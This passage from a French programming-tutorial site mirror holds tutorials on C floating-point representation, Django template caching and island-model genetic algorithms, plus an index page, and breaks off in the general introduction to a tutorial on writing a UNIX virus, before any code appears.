exemple), car GCC laisse cette définition aux headers du système ; or, ceux de Windows ne définissent pas STDC_IEC_559 , en partie parce qu'il y aurait un risque d'incompatibilité entre GCC et la bibliothèque C de Windows. En pratique : savoir si l'implémentation utilise IEEE 754 Puisqu'on ne peut pas compter sur la constante STDC_IEC_559 pour nous renseigner, il faut trouver un autre moyen de déterminer si oui ou non on travaille avec IEEE 754. Pour cela, le meilleur moyen reste de se renseigner auprès de votre compilateur favori et/ou de votre plateforme cible. Toutefois, si vous tenez vraiment à faire cette vérification avec du code, je peux vous offrir des pistes. dynamiquement (c'est-à-dire au moment de l'exécution de votre programme) : Vous pouvez par exemple déclarer un certain nombre de variables de type à virgule flottante, puis vérifier que leur représentation mémoire correspond à celle attendue en se basant sur IEEE 754. Il faudrait effectuer cette série de tests pour les différents types de nombres (zéros, dénormalisés, normalisés, infinis, NaN). Un tel code ne serait pas infaillible (on peut très bien imaginer des formats ressemblant à IEEE 754, qui passeraient avec succès tous les tests) mais il permet d'éliminer certains formats. L'inconvénient est que du code inutile est intégré à l'exécutable, et que l'on perd du temps à chaque exécution du programme lorsqu'on effectue ces vérifications. À éviter en pratique, donc. D'un point de vue technique, cela reste cependant un bon exercice. :ange: statiquement (c'est-à-dire lors de la compilation) : Pour cela, il faut vous appuyer sur votre ami le préprocesseur. Sans détailler, vous pouvez tester la valeur des macros définies dans le header du C99 ; celles-ci caractérisent l'implémentation des nombres flottants : précision, exposants minimum et maximum, valeurs minimales et maximales. Tout cela en 3 variantes pour chacun des 3 types à virgule flottante du C. Cette approche présente l'avantage de ne garder que le code nécessaire lors de la compilation et de ne pas faire cette vérification à l'exécution.Mais avouez que c'est fichtrement moins rigolo. L'avantage est que le bon fonctionnement du code serait indépendant du compilateur utilisé, facilitant ainsi les échanges de code. Notez toutefois que les propositions ci-dessus vérifient la représentation en mémoire, mais pas les différentes opérations sur les flottants. Ce cours touche enfin à sa fin ! On sait maintenant comment manier correctement des nombres réels, et surtout ce qui se cache sous le capot. On a vu les difficultés qu'ils causent, et des solutions. Quelques (res)sources… articles de Wikipédia : virgule flottante , IEEE 754 (n'hésitez pas à aller sur les articles anglais qui sont bien plus complets), wikilivre (actuellement en rédaction) : Arithmétique flottante , page présentant l'astuce pour comparer des flottants : Comparing floating point numbers par Bruce Dawson (en) , la norme C99 ! ou plutôt son draft (n1256), disponible ici en PDF (en) … … et des liens additionnels : page de manuel de isinf , isnan , etc. : macros de classification en virgule flottante , pages du manuel de la lib GNU C concernant les flottants (concepts, constantes fournies par <float.h> , exemple pour IEEE 754) : floating type macros (en) , et ce site très pratique permettant de calculer la représentation en mémoire d'un nombre à virgule et l'inverse, pour les deux formats principaux de IEEE 754 (32 et 64 bits) : IEEE-754 Analysis (en) ."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/mise-en-cache-intelligente-avec-django","title":"Mise en cache intelligente avec Django","text":"Vous êtes en train de construire votre site internet avec Python et Django, tout va pour le mieux du monde ; mais plus votre site grossit et plus des fonctionnalités gourmandes apparaissent, effectuant de plus en plus de requêtes SQL même si vous les optimisez afin d'éviter la casse. Que faire quand on a optimisé la génération de ses pages mais que le rendu est encore lent ? Utiliser la mise en cache ! Présentation Les différentes implémentation du cache Différents niveaux de mise en cache Exemple : système de notifications Situation initiale Mise en place du cache Indépendance du cache Mise à jour intelligente du cache Persistance indésirable Péremption automatique Présentation La mise en cache est une technique courante qui consiste à stocker pendant un temps défini un résultat qui provient d'une opération lourde . Lors de la demande d'accès à ce résultat, on retourne la valeur que l'on a gardé en mémoire au lieu de relancer l'opération lourde, il en résulte un gain de réactivité (très) important. Les différentes implémentation du cache Django nous propose nativement un système de cache assez poussé. Celui-ci vous permet d'utiliser différentes plateformes afin de se souvenir des valeurs que vous voulez réutiliser, dont notamment : Solutions très rapides : via la RAM memcached , la référence en la matière qui va stocker directement dans la mémoire vive les valeurs afin de garantir un temps d'accès optimal ; de plus, l'architecture distribuée de memcached permet d'utiliser des machines distantes afin de répartir la mise en cache, tout est géré automatiquement. Si vous n'êtes pas en mesure d'installer, de configurer et d'utiliser memcached (par exemple si vous n'avez pas les droits root sur le serveur) mais que vous voulez tout de même avoir un stockage en RAM pour un accès plus rapide, Django possède un backend prévu à cet effet . Solutions un peu moins rapides : via le disque Dans une base de données ; Dans des fichiers temporaires . Autres solutions : Un cache qui ne cache rien (à utiliser sur des versions de développement par exemple) ; Un cache personnalisé . C'est à vous de faire le choix concernant le backend que vous voulez utiliser en fonction de vos besoins, mais sachez qu'il est possible d'utiliser plusieurs backends sur un même site ! Par exemple, les éléments peu nombreux et utilisés très souvent pourront être stockés dans la mémoire vive alors que les éléments plus volumineux, nombreux et moins souvent accédés pourront se trouver sur le disque (sauf si vous avez à votre disposition 256 Go de RAM). Différents niveaux de mise en cache De plus, Django nous permet différent seuils de granularité : Une mise en cache globale du site : chaque page sera cachée pendant un certain temps. Une mise en cache par vue : seulement certaines vues seront cachées par l'utilisation d'un décorateur Python. Une mise en cache au niveau des templates : c'est la méthode la plus fine, qui permet de cacher uniquement certains bouts dans certains modèles HTML. C'est en se basant sur cette dernière technique que nous allons réaliser une mise en cache intelligente. Exemple : système de notifications Situation initiale Prenons un cas concret : vous êtes en train de réaliser une application pour votre site qui s‘occupe de gérer l'envoi de messages entre les membres de votre site. Vous avez intégrer la notification de nouveaux messages via une icône présente sur tout le reste de votre site. <div class=\"message-box-icon\"> Vous avez {{ get_new_messages_count user }} nouveaux messages. </div> Cependant, la requête pour récupérer le nombre de nouveaux messages est lourde et prend 3 secondes . Sachant que cette requête est effectuée sur chaque page puisque vous vous servez le l'icône pour afficher le nombre de nouveaux messages, toutes les pages de votre site mettent 3 secondes de plus à charger à cause de cette requête . Heureusement, comme on l'a vu précédemment, Django nous propose un système de mise en cache au niveau des templates HTML. Et si nous utilisions cet outil afin d'accélérer la génération de nos pages ? Mise en place du cache Rendons nous dans notre template où le code gourmand est appelé, et mettons ce résultat en cache : {% load cache %} <div class=\"message-box-icon\"> {# On cache le bloc suivant sous le nom de 'messages-count' pendant 120 secondes #} {% cache 120 message-count %} Vous avez {{ get_new_messages_count user }} nouveaux messages. {% endcache %} </div> Après avoir configuré correctement le système de cache (n'utilisez pas le cache qui ne cache pas sinon ça risque de ne pas fonctionner), on remarque que la première génération de page prend toujours 3 secondes mais que les autres pages sont rendues quasiment instantanément ! Cependant il y a un problème. En effet, si vous vous connectez sous le nom d'un autre utilisateur, alors vous aller voir le bloc qui a été caché pour le premier utilisateur à avoir entrainé la mise en cache. Ainsi il se peut très bien que vous ayez une notification de nouveau message alors que c'est en fait le nombre de messages pour le premier utilisateur qui avait été mis en cache ! Indépendance du cache Django nous permet de palier à ce problème : il nous suffit de trouver un élément unique qui diffère et de le passer à la balise de mise en cache pour que celle-ci stocke les différentes valeurs en fonction de cet élément unique. Dans le cadre de nos utilisateurs, on peut dire que le pseudonyme est un bon élément unique : {% load cache %} <div class=\"message-box-icon\"> {# On cache le bloc suivant sous le nom de 'messages-count' pendant 120 secondes #} {% cache 120 message-count user.username %} Vous avez {{ get_new_messages_count user }} nouveaux messages. {% endcache %} </div> Ainsi, chaque utilisateur aura sa propre mise en cache de son nombre de nouveaux messages. Ouf ! Mise à jour intelligente du cache Persistance indésirable Il nous reste cependant un dernier petit problème à régler : Considérons que je viens de recevoir un nouveau message ; la valeur mise en cache m'indique bien que j'ai un nouveau message puisque c'est la première page que je génère, tout fonctionne comme prévu. Je lis mon message et éventuellement répond à son auteur avant de continuer paisiblement ma navigation sur le site. Cependant, je remarque que le nombre de nouveaux messages reste bloqué à 1 ! En effet, la valeur a été mise en cache pendant un certain temps (120 secondes dans notre exemple précédent) et ne sera pas actualisée avant que ces 120 secondes se soient écoulées ! Cet effet est gênant pour tous les utilisateurs de votre site, mais comment faire pour éviter ce cas de figures tout en gardant les bénéfices de la mise en cache ? Péremption automatique Afin de solliciter un appel frais à la fonction de génération de notifications, il nous faudrait invalider le contenu qui a été précédemment mis en cache. Pour cela, nous allons devoir utiliser l'accès « bas niveau » au cache de Django. Le cache fonctionne comme un dictionnaire avec un système de clés/valeurs ; pour supprimer un élément il nous faut donc retrouver sa clé. Les clés utilisées au niveau du cache sont assez bizarres, considérons le bloc suivant : {% cache 120 message-count user.username %} ... {% endcache %} La clé associée sera la suivante : template.cache.message-count.f71dbe52628a3f83a77ab494817525c6 On y retrouve le nom du bloc ainsi qu'un hash MD5 créé à partir des arguments passés au bloc. Pour retrouver facilement cette clé, on peut utiliser la fonction make_template_fragment_key apparue dans la version 1.6 de Django : >>> from django.core.cache.utils import make_template_fragment_key >>> make_template_fragment_key ( 'messages-count' , [ 'toto' ]) 'template.cache.message-count.f71dbe52628a3f83a77ab494817525c6' Il nous reste maintenant à supprimer cette clé du cache lors des actions qui pourraient potentiellement mettre à jour ce cache. Par exemple, si l'on reprend notre cas, on aimerai bien que le cache soit mis à jour lors de la consultation du nouveau message : from django.core.cache import cache from django.core.cache.utils import make_template_fragment_key def view_message ( request ): # Si on consulte un message qui n'était pas lu jusqu'à présent, # on peut considérer qu'il est lu et donc mettre à jour l'icône # du nombre de messages non-lus. if not message_read ( msg ): cache . delete ( make_template_fragment_key ( 'message-count' , request . user . username )) # Rendu du template, etc. Il vous reste à mettre en place cette demande explicite de suppression de contenu mis en cache à chaque endroit où ce contenu aurait pu en effet être modifié. Ainsi, les utilisateurs sont toujours prévenus en temps et en heure et en plus si aucun changement n'a été détecté la valeur peut directement être lue dans le cache ! Vous êtes désormais en mesure d'utiliser la mise en cache de Django sur votre site internet sans y retrouver les effets néfastes : la mise à jour différée des données. Sources : La documentation officielle de Django 1.6 ; Mon expérience personnelle lors de la mise en place d'un système de cache pour Progdupeupl ."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/modele-de-parallelisme-en-iles-pour-des-metaheuristiques","title":"Modèle de parallélisme en îles pour des métaheuristiques","text":"Introduction Lorsque l'on parle de parallélisme, on pensera la majorité du temps à un gain de performance se traduisant par un temps de calcul moins long. Il existe deux grands types de parallélisme qui sont le parallélisme de données et le parallélisme de tâches. Le premier vise à effectuer en parallèle un traitement unique et coûteux en temps sur des données. Il s'agit essentiellement de modifier un algorithme déjà existant pour l'adapter au parallélisme. Le second type préfère paralléliser des tâches qui ne dépendent pas l'une de l'autre, permettant également un gain de temps. Outre la modification d'algorithmes déjà existants, ce type de parallélisme fait naître de nouveaux algorithmes dont l'avantage n'est pas nécessairement la réduction du temps de calcul mais une meilleure stabilité numérique, une plus grande convergence ou d'autres propriétés mathématiques intéressantes. C'est le cas par exemple du modèle en îles, qui par nature, n'existe que sur des architectures parallèles. Ces algorithmes sont évidemment plus spécifiques et ne s'appliquent que dans des domaines précis. Ainsi, le modèle en îles s'applique uniquement à des métaheuristiques à base de population comme les algorithmes génétiques principalement ou encore les algorithme d'optimisation par essaims particulaires. Dans un premier temps, nous rappelerons brièvement le principe et le fonctionnement des algorithmes génétiques avant de présenter dans une seconde partie le modèle de parallélisme en îles. Nous discuterons de l'intérêt d'un tel modèle, sans entrer dans les considérations techniques ou théoriques. Enfin, dans une dernière partie, nous présenterons des résultats empiriques et leur analyse obtenus sur une implémentation du modèle en îles. Introduction Quelques rappels sur les algorithmes génétiques Principe Fonctionnement Modèle en îles Modèle hétérogène : vers une optimisation multi-objectif ? Analyse des résultats des tests Modèle homogène vs Sérialisé Test 1 Test 2 Influence du facteur communication Test déterministe Test non déterministe : ANOVA 1 Conclusion Quelques rappels sur les algorithmes génétiques Principe Les algorithmes génétiques font partie des méthodes dites d'intelligence calculatoire. Ils se basent sur la théorie de l'évolution darwiniste pour résoudre un problème en faisant évoluer un ensemble de solutions à un problème donné, dans l'optique de trouver un optimum global ou, à défaut, local. Ces algorithmes sont principalement stochastiques, car ils utilisent itérativement des processus aléatoires. La majorité de ces algorithmes servent à résoudre des problèmes d'optimisation au sens large. On parle donc de métaheuristiques car ils ne s'appliquent pas à un problème en particulier mais sont capables de donner de bons résultats, en un sens à définir, sur une large classe de problèmes et d'instances. Parmi les grandes méthodes largement utilisées, on note le recuit simulé, la recherche tabou, la recherche itérative locale ou encore des méthodes MCMC (Markov Chain, Monte Carlo) comme l'algorithme de Metropolis-Hastings (sur lequel se base le recuit simulé par ailleurs), et des méthodes plus spécifiques comme le NSGA-II (Non-Dominated Sorting Genetic Algorithms) et IBEA (Indicator-Based Evolutionnary Algorithm) pour l'optimisation multi-objectifs. Fonctionnement Il existe une multitude de métaheuristiques et les algorithmes génétiques en font partie. Etant donné que le modèle en îles dont fait l'objet cet article présuppose des algorithmes à base de population, nous ne présenterons que ce type de méthodes. Nous partons d'une population initiale où chaque individu représente une solution potentielle au problème. Cette population peut ou non être générée aléatoirement. La manière de générer la population est propre au problème voire à l'instance, mais partons du principe que l'on génère la population de manière aléatoire pour simplifier. Ensuite, la population est évaluée, c'est à dire que l'on attribut un indicateur qualitatif à chaque individu. La manière d'évaluer est très spécifique au problème et pas toujours évidente à mettre au point. En effet, dans des problèmes d'optimisation classique, nous avons très souvent une formulation mathématique d'une fonction à minimiser ou maximiser. Ainsi l'évaluation peut très souvent se limiter à la valeur de cette fonction évaluée au point représenté par l'individu sélectionné. Cependant, il existe des problèmes où aucune formulation explicite du système à optimiser n'existe. L'évaluation est généralement l'opération la plus coûteuse pour ce genre de méthode, à tel point que dans certains cas où l'on dispose tout de même d'une formulation explicite on préfère évaluer de manière moins directe en calculant d'autres indicateurs. Les meilleurs individus sont alors sélectionnés. Là encore, les mécanismes de sélections pourraient largement être discutés : doit-on sélectionner les meilleurs individus ? aléatoirement ? combien au regard de la population totale ? Ce n'est pas l'objet de cet article mais la littérature sur le sujet est relativement riche et intéressante. Après être sélectionnés, les individus sont croisés. C'est à dire que l'on va prendre, qu hasard, des parties de chaque individu pour en former un nouveau, tout comme un être humain se voit affublé au hasard des allèles du père ou de la mère. On effectue alors des mutations avec une probabilité assez faible. Les mutations permettent d'éviter de tomber dans des optimums locaux, mais doivent être assez rares pour conserver une convergence de l'algorithme. Enfin, les nouveaux individus sont replacés dans la population initiale, les moins bons sont supprimés pour garder une population de taille constante. Encore une fois, il y aurait beaucoup à dire : comment croiser les individus ? comment choisir la probabilité de mutation ? quel opérateur de mutation choisir ? De même que la restriction sur la taille constante de la population n'est pas une nécessité. Le processus est itéré le nombre de générations voulues ou selon des paramètres divers : temps, nombre d'évaluations, etc. Modèle en îles Le théorème dit du no free lunch 1 démontre qu'il n'existe pas de métaheuristique meilleure qu'une autre et que la qualité d'une métaheuristique ne peut-être établi qu'au regard de certaines classes de problèmes et dépend également des paramètres de l'algorithme voire de son implémentation. Ainsi, il est difficile d'anticiper l'adéquation d'une métaheuristique sur une instance quelconque sans expérimentation ou une phase d'apprentissage. Un facteur primordial de l'efficacité d'une méthode à base de population sur une instance donnée réside dans l'équilibre entre l'intensification (c'est à dire une sélection élitiste des individus ce qui a pour conséquence de forcer la convergence) et la diversification (c'est à dire élargir le champs de recherche des solutions). On comprendra aisément la difficulté à allier à la fois ces deux concepts antagonistes. Le modèle en îles consiste à lancer plusieurs algorithmes génétiques à base de population, les îles, qui vont évoluer de manière indépendante mais intéragir par moments. Cela permet des convergences locales d'algorithmes tout en conservant une diversité globale grâce à ces intéractions. L'organisation des îles au sein du modèle est régie par une topologie qui peut influencer la tolérance à la convergence locale. En effet, une île isolée, avec peu de communications vers d'autres îles, impactera moins la convergence prématurée ou non, du modèle tandis qu'une île centrale, comme il y en a une dans une topologie en étoile, pourra avoir des effets bénéfiques ou néfastes selon la politique de l'île. Typiquement, le facteur principal influençant la diversification / intensification du modèle (c'est à dire à un niveau d'abstraction supérieur à celui du simple algorithme) est la politique propre à chaque île. Les intéractions entre îles sont définies par certaines règles : périodicité dans le nombre de générations, périodicité temporelle, mais également des considérations sur la qualité d'une solution, etc. Dans les modèles classiques, la politique et la topologie sont des attributs statiques ne permettant pas d'adapter dynamiquement les étapes de diversification ou d'intensification. Des travaux actuels s'intéressent à des topologies dynamiques, changeantes au cours de l'évolution des algorithmes selon certains signaux (des informations sur la convergence des individus, l'intégration des population migrantes,...). De la même manière, la topologie peut être stochastique. Chaque lien inter-île a une certaine probabilité d'être établi au moment d'une migration. Ces probabilités peuvent être statiques, mais également dynamique, permettant, par exemple, d'isoler des îles n'apportant rien en terme de diversité ou de qualité des solutions. En résumé, les apports théoriques du modèle en îles résident dans une vitesse de convergence plus rapide, un domaine de recherche plus vaste et une meilleure gestion des étapes de diversification / intensification qui se traduit par la sortie potentielle de certains optimums locaux. Modèle hétérogène : vers une optimisation multi-objectif ? Rappelons qu'un individu pour un algorithme génétique représente une solution au problème. Plus exactement, il est une représentation d'une solution qu'il faut ensuite décoder pour obtenir la solution dans notre espace de solutions. Ainsi, si l'on cherche à trouver un polynôme de degré $k$ qui minimise la distance à certains points (une simple interpolation en somme), nous allons naturellement coder une solution par un vecteur de dimension $k$ où chaque composante codera un coefficient du polynôme. Ainsi nous aurons la fonction de codage $C : \\mathbb{P}_k \\rightarrow \\mathbb{R}&#94;k$ avec d'éventuelles contraintes sur le domaine. Il est important d'avoir en tête cette considération sur la représentation car il n'est pas toujours aisée d'avoir une unique manière de coder une solution. De manière générale, selon les algorithmes à base de population, le codage peut varier, notamment par l'ajout d'information supplémentaire (une vitesse dans les algorithmes d'optimisation par essaims de particules par exemple) et par l'expérience (ou la théorie) qui nous montre qu'un type de représentation est plus efficace qu'un autre pour tel problème sur tel algorithme. Ainsi, il est envisageable d'avoir un modèle en îles avec des îles hétérogènes, c'est à dire avec des algorithmes différents sur les îles et donc, potentiellement, un codage différent d'une île à l'autre. Il peut en effet être intéressant de chercher des solutions à l'aide de différents algorithmes et de les faire intéragir de manière à ce qu'ils s'échangent des informations utiles pour converger vers une solution de grande qualité. Pour se faire, il faut envisager un type de représentation global, généralement celui qui code les individus de la majorité des îles, et de définir des fonctions de conversion entre les différentes représentations. Un interêt du modèle hétérogène est qu'il permet d'avoir plusieurs codage pour une seule solution ainsi que plusieurs optimisation simultanée via des fonctions objectifs différentes selon les îles. Ainsi, il est possible d'espérer une optimisation simultannée de critères antinomiques. Prenons l'exemple du voyageur de commerce multi-objectifs, avec une double valuation du graphe : chaque arc porte à la fois une distance mais également un risque. Bien souvent plus le chemin est court plus le risque est élevé. L'objectif est de minimiser à la fois la distance mais également le risque. Si une solution dans l'espace des solutions est un tour muni de la double valuation des arcs, on peut imaginer deux codages, ne tenant respectivement compte que du risque ou de la distance afin d'effectuer une optimisation mono-objectif classique. Ainsi avec le modèle d'îles nous pouvons lancer deux optimisations mono-objectifs sur plusieurs îles, avec des algorithmes différents, connectées selon une certaine topologie avec certaines politiques, de sorte à éventuellement privilégier tel ou tel objectif. Lorsqu'une île veut envoyer des individus, si son codage n'est pas le codage principal choisi, elle fait appel à sa fonction de conversion. Dans notre cas, si nous choisissons comme codage principal la valuation par les distances, alors une île qui optimise le risque convertira le tour en un tour avec les distances associées. De fait, les meilleurs individus seront envoyés à un algorithme pour qui normalement il ne sera pas nécessairement bon. Cependant, il se peut que l'individu soit suffisemment bon pour rester dans la nouvelle population voire interragir avec. On espère ainsi réussir à obtenir les individus appartenant au front de Pareto nous permettant ensuite de faire un choix de la meilleure solution à retenir selon certains critères. Le modèle en îles est donc particulièrement remarquable en cela qu'il permet d'obtenir des solutions correctes à un problème d'optimisation multi-objectifs en effectuant simultanément des optimisations mono-objectifs, ce qui permet en théorie de grandement réduire le temps de calcul important des méthodes classiques de l'optimisation multi-objectif. Analyse des résultats des tests Les tests de performances doivent quantifier à la fois la qualité de la programmation parallèle et vérifier les apports théoriques du modèle en île dans le but de valider l'implémentation. Les tests de performance ont été effectués sur un problème du voyageur de commerce, avec des instances de différentes tailles (approximativement 100 villes à 13 000 villes). Il s'agit d'instances réelles. La première série de tests est purement descriptive puisqu'elle ne fait que donner des indicateurs sur des instances déterministes, c'est à dire avec une graine fixée. La seconde partie des tests est plus intéressante parce qu'elle donne une réponse statistique quand à l'influence de certains facteurs. Modèle homogène vs Sérialisé Test 1 Objectif : Mettre en évidence une rapidité de convergence accrue du modèle. Protocole : Graine fixée Population de 1000 individus Modèles d'îles homogènes Politique élitiste : 1. Envoi d'individu toutes les 25 générations. 2. Sélection par tournoi de 2 individus parmi 100. Résultats : ||Population totale ||| 1000 meilleurs | ------------ | ----------- | ---------------- | ---------------- | ---------------- | --------------- | ------------ .| Sérialisé | 3 îles | 4 îles | Sérialisé | 3 îles | 4 îles Variance | 13966,68 | 688,20 | 39,00 | 13966,68 | 0,89 | 0,99 Ecart Moyen | 94,64 | 23,83 | 0,93 | 94,64 | 0,89 | 0,99 SCR | 13952716,15 | 2063928,59 | 155980,87 | 13952716,15 | 892,41 | 997,69 Moyenne | -2512,54 | -1340,05 | -1243,24 | -2512,54 | -1316,67 | -1242,04 Analyse des résultats : Dans le cas où la graine est fixée la variance de l'échantillon diminue vraiment, tant en passant de l'algorithme sérialisé à 3 îles qu'en passant de 3 à 4 îles. Cependant, en ne considérant que les 1000 meilleurs individus, le passage de 3 à 4 îles ne semblent plus significatifs. L'algorithme semble avoir convergé, aussi bien pour 3 et pour 4 alors qu'il n'a vraissemblablement pas convergé pour l'algorithme seul. On peut également se demander si la politique très élitiste mise en place n'a pas fait converger les algorithmes vers un minimum local, ainsi si l'algorithme converge à partir de 3 îles et pour les critères d'arrêts spécifiés, alors il convergera vers le même optimum pour un nombre d'îles supérieur (sauf si par chance ces îles supplémentaires sont générés avec des individus meilleurs à la base). Les autres métriques sont unanimes : la SCR est divisé par 10 à 100 voire par un facteur $10&#94;6$ sur des populations constantes par exemple, montrant fitness bien meilleurs sur le modèle d'îles. Le graphique nous montre clairement que les modèles d'îles ont convergés alors que la fitness des individus de l'algorithme seul semble continuer de s'améliorer (cf. dernier tiers). Le test s'avère ici plus qualititatif que quantitatif car il ne répond pas à la question suivante : quelle est le gain sur la vitesse de convergence. Accessoirement on peut également se demander si l'algorithme sérialisé aurait convergé vers un meilleur optimum ou non, et ce, malgré une politique très élitiste. Test 2 Objectifs : Quantifier le gain sur la rapidité de convergence du modèle d'île. Protocole : Même protocole qui ci-dessus. On changera les critères d'arrêt pour un critère sur la qualité de la solution que l'on fixera à -1350 qui correspond à peu près à la solution obtenue pour l'algorithme seul. On ajoutera un compteur sur le nombre de générations avant d'atteindre cette fitness. Résultats : Sérialisé : 3361 générations 3 îles : 1261 générations * 4 îles : 968 générations * * Obtenus comme moyenne sur 100 tests. Notons également que le nombre maximal de générations pour 4 îles est atteint pour 1401, soit plus que la moyenne pour 3 îles. A l'inverse le meilleur résultat est obtenu pour 904 générations. Analyse des résultats : L'algorithme s'arrête au moment où l'algorithme est prêt à converger (première apparition de la meilleure fitness observée). Le résultat montre bien que les modèles d'îles convergent plus rapidemment. On obtient un ratio de 2,6 pour le modèle à 3 îles et un ratio de 3,47 pour le modèle à 4 îles. Influence du facteur communication Test déterministe Objectifs : Mettre en avant l'intérêt des communications dans la convergence de l'algorithme et la qualité de solutions. Protocole : Graine fixée. 3 îles sans communication, 3 îles avec communications (topologie complète et politique élitiste). Partant d'une même population, on lance les deux modèles pour 1000 générations par île et on regarde la qualité finale obtenue sur l'ensemble de la population. Résultats : . Communications Sans communication Variance 12155,66 170,68 Ecart Moyen 87,43 10,95 Moyenne -2032,36 -1427,54 SCR 36454825,99 511894,45 Ratio SRC 71,2155128426 Analyse des résultats : Tous les indicateurs sont favorables au modèle avec communication. On note une amélioration moyenne de 30% des solutions et une somme des carrés des résidus qui a diminué d'un facteur 70. Le graphique montre que le modèle sans communication n'a pas encore convergé alors que celui avec communication est en passe d'avoir complètement convergé. Test non déterministe : ANOVA 1 Dans le cas général où la graine n'est pas fixée, nous voulons déterminer si les communications ont un facteur sur la qualité de la solution obtenue. Pour cela nous allons essayer de nous servir de l'ANOVA 1 : l'analyse de variance à un facteur. Nous avons ici un facteur, les communications, avec deux modes : avec ou sans communication. Nos observations seront notées $y_{ij}$ avec $i\\in {1,2}$ respectivement sans et avec communication, et $j\\in {1...100}$ puisque nous avons réalisé 100 expériences avec et sans communication. Le modèle d'ANOVA 1 se basent sur des hypothèses qui ne sont pas triviales dans notre cas : Les données $y_{ij}$ obtenus sont réalisations d'une variable aléatoire $Y_{ij}$ de loi normale $N(\\mu _{i}, \\sigma &#94;2)$ Les variables aléatoires $(Y_{ij})$ sont globalement indépendantes. Notre modèle serait donc : $Y_{ij} = \\mu {i} + \\epsilon $ Avec $\\epsilon _{ij}$ indépendants et identiquement distribués de loi normale $N(0, \\sigma &#94;2)$. Les hypothèses du modèle n'étant pas trivialement vérifiées, il nous faudra dans un premier temps les vérifier avant de réaliser l'analyse de la variance à proprement parler. Pour cela nous allons adopter le plan qui suit : Une estimation par noyau nous dira si la fitness des meilleurs individus suit une loi normale. Un test de Barlett nous dira si il y a homoscédasticité (condition du modèle). Nous dresserons alors un tableau d'analyse de variance. Un test de comparaison par approche de modèle nous donnera une réponse au risque de $5\\%$ quand à l'influence du facteur communication sur la différence des moyennes des deux groupes. Les tests de normalité nous permettent de conclure à la normalité des deux échantillons. Les tests effectués sont le test de Lilliefors et le test de Shapiro-Wilk. Ils ont été réalisés sous R grâce au paquet normtest. > lillie.test(t(X1)) Lilliefors (Kolmogorov-Smirnov) normality test data: t(X1) D = 0.0599, p-value = 0.5072 > shapiro.test(t(X1)) Shapiro-Wilk normality test data: t(X1) W = 0.9859, p-value = 0.3694 > lillie.test(t(X2)) Lilliefors (Kolmogorov-Smirnov) normality test data: t(X2) D = 0.0547, p-value = 0.6533 > shapiro.test(t(X2)) Shapiro-Wilk normality test data: t(X2) W = 0.992, p-value = 0.8184 Le seuil fixé est de $5\\%$. L'hypothèse du test est que les individus suivent une loi normale. La p-value étant supérieure au seuil, on ne rejette pas l'hypothèse et on conclue donc à la normalité de l'échantillon. fligner.test(list(t(X1),t(X2))) Fligner-Killeen test of homogeneity of variances data: list(t(X1), t(X2)) Fligner-Killeen:med chi-squared = 15.5555, df = 1, p-value = 8.012e-05 Le test de variance indique une variance non-commune aux deux groupes. Cependant, cette variance non homogène est moins problématique qu'une distribution non normale des individus, surtout lorsque les groupes comportent autant d'individus. Ainsi, le test de Fisher effectué lors de l'ANOVA sera potentiellement faussé en rejettant plus facilement l'influence significative du facteur étudié. Analyse du tableau d'ANOVA : Nous observons une p-value de l'ordre de $10&#94;{-62}$, très largement inférieure au seuil des 5% fixés. On peut donc conclure à l'influence significative des communications sur notre modèle. Conclusion Nous avons vu comment le modèle d'îles permettait d'obtenir des propriétés intéressantes de convergence et de stabilité. Nous avons également discuté une approche potentiellement multi-objectifs grâce au modèle en îles. Enfin, nous avons analysé quelques résultats d'une implémentation du modèle d'îles afin de justifier les apports théoriques. Il s'agit là bien sur d'une introduction concernant le modèle d'îles et il se pose maintenant pas mal de questions quand aux choix des nombreux paramètres liés au modèle : quelles politiques choisir ? comment intégrer les migrants ? comment choisir la topologie ? Toutes ces questions font appels à la connaissance du problème à résoudre par l'utilisateur mais elles font également partie d'un pan de la recherche qui s'intéresse à l'optimisation de paramètres (ou plus généralement de programmes), à la fois durant le déroulement d'un algorithme, de manière autonome, mais aussi à priori ou à postériori. Cet aspect sera certainement traité dans un prochain article. \"Illustration Wikipédia, by Nohjan\" ↩"},{"tags":"pages","url":"https://yliesc.github.io/pages/pdp","title":"Progdupeupl","text":"Cette page ce fait miroir de l'ex-site Progdupeupl , à l'époque né du mécontentement de certains membres de la communauté d' OpenClassroom (anciennement Site du Zéro ). Après maintenant 3 ans de fonctionnement, le site a été coupé et aucun moyen n'a été mis en place afin de pouvoir consulter le contenu (tutoriels & articles) autrefois rédigés par ces membres. C'est exactement le but auquel répond cette page : pouvoir y accès de manière simple & agréable. Chaque tutoriel/article que vous verrez ici est distribué sous sa licence original ( CC-BY-SA dans le cas où aucune licence n'est explicitement indiquée) et la propriété intellectuelle du contenu revient de manière direct à l'auteur de ce dernier. Pour toute informations, questions ou réclamations, vous trouverai les moyens de me contacter sur la page Contact . Langages C++, auto et decltype Type Erasure L'idiome RAII appliqué au C++ À la découverte d'Erlang Interpréter un petit langage impératif avec OCaml Liaisons en C++ Idiome NVI & Paramétrage par politique en C++ Brève présentation du langage Ada L'assembleur avec GCC Le langage C Mise en cache intelligente avec Django Introduction à libclang La règle de la \"spirale horaire\" (Clockwise/Spiral Rule) Les nombres à virgule flottante Le préprocesseur Aliasing et pointeurs restreints Les identificateurs en langage C Trouver et supprimer les goulots d'étranglement en Erlang Algorithmique Similarité cosinus et recherche textuelle Découverte des algorithmes de graphe Algorithmique pour l'apprenti programmeur Modèle de parallélisme en îles pour des métaheuristiques Réflexion sur la complexité algorithmique Introduction à la compilation Sécurité Programmez votre premier virus UNIX Introduction à la rétro-ingénierie de binaires #283 Autre Introduction à LaTeX #74 Apprendre à rechercher et à réfléchir #266 Jouons avec l'authentification Windows #285 Processeurs multi-cœur : introduction aux modèles mémoire faibles #264"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/programmez-votre-premier-virus-unix","title":"Programmez votre premier virus UNIX !","text":"Le domaine de la virologie Informatique tient une place prépondérante de nos jours. Il suffit, pour s'en apercevoir d'observer le nombre de virus existant et des solutions anti-virales existantes (et de la part du marché qu'elles détiennent). Et paradoxalement, ce domaine reste très obscur, peu enseigné de manière officielle. Souvent perçu par le peuple comme un domaine très obscur, réservé aux petits génies et autres hackers, autant d'idées véhiculées très largement par les médias, la virologie est pourtant abordable par tous pour peu d'avoir quelques connaissances de base et beaucoup de motivation. De nombreux travaux universitaires ont par ailleurs été réalisés afin de mettre en lumière ce domaine et pouvoir l'aborder de manière rigoureuse. Les « virus » peuvent ainsi être décrits de manière totalement formelle afin d'être étudiés en profondeur et ce, de manière (très) théorique. Mais commençons modestement et 